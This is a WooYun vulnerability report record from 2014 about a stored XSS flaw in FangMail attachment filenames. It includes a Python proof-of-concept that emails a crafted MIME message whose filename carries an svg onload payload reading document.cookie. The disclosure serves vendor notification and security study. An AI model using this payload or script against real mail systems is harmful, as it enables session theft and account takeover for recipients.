{"id": 54067, "wybug_id": "wooyun-2014-065658", "wybug_title": "FangMail又一处储存型XSS", "wybug_corp": "FangMail", "wybug_author": "夕风号", "wybug_date": "2014-06-22 01:29", "wybug_open_date": "2014-09-20 01:30", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向公众公开  简要描述： 又一处 详细说明：  附件文件名处未过滤，可触发XSS假设攻击者为attack@attack.com，受害者为victim@victim.com\nimport smtplibimport base64sender = 'attack@attack.com'reciever = 'victim@victim.com'message = \"\"\"From: <test> <attack@attack.com>To: <test> <victim@victim.com>Subject: TestMIME-Version: 1.0Content-Type: multipart/mixed; \tboundary=\\\"YOUAREUNDERATTACK\\\"--YOUAREUNDERATTACKContent-Type: multipart/alternative; \tboundary=\\\"YOUAREUNDERATTACK\\\"--YOUAREUNDERATTACKContent-Type: text/plain; charset=GBKContent-Transfer-Encoding: base64IFlvdSBhcmUgdW5kZXIgYXR0YWNrLgoKCg==--YOUAREUNDERATTACKContent-Type: text/html; charset=GBKContent-Transfer-Encoding: base64PGRpdiBzdHlsZT0ibGluZS1oZWlnaHQ6MS43O2NvbG9yOiMwMDAwMDA7Zm9udC1zaXplOjE0cHg7Zm9udC1mYW1pbHk6YXJpYWwiPjxkaXYgc3R5bGU9ImxpbmUtaGVpZ2h0OjEuNztjb2xvcjojMDAwMDAwO2ZvbnQtc2l6ZToxNHB4O2ZvbnQtZmFtaWx5OmFyaWFsIj4mbmJzcDtZb3UgYXJlIHVuZGVyIGF0dGFjay48L2Rpdj48YnI+PGJyPjxzcGFuIHRpdGxlPSJuZXRlYXNlZm9vdGVyIj48c3BhbiBpZD0ibmV0ZWFzZV9tYWlsX2Zvb3RlciI+PC9zcGFuPjwvc3Bhbj48L2Rpdj48YnI+PGJyPjxzcGFuIHRpdGxlPSJuZXRlYXNlZm9vdGVyIj48c3BhbiBpZD0ibmV0ZWFzZV9tYWlsX2Zvb3RlciI+PC9zcGFuPjwvc3Bhbj4=--YOUAREUNDERATTACK----YOUAREUNDERATTACKContent-Type: text/plain; name=\\\"filename.txt<svg onload=alert(document.cookie)>\\\"Content-Transfer-Encoding: base64Content-Disposition: attachment; filename=\\\"filename.txt<svg onload=alert(document.cookie)>\\\"Q29kZSBpcyBwb2V0cnku--YOUAREUNDERATTACK--\"\"\"try:   smtpObj = smtplib.SMTP('smtp.attack.com')   smtpObj.login('attack','password')   smtpObj.sendmail(sender, reciever, message)   print \"Successfully sent email\"except Exception:   print \"Error: unable to send email\"\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 夕风号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-26 22:01 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}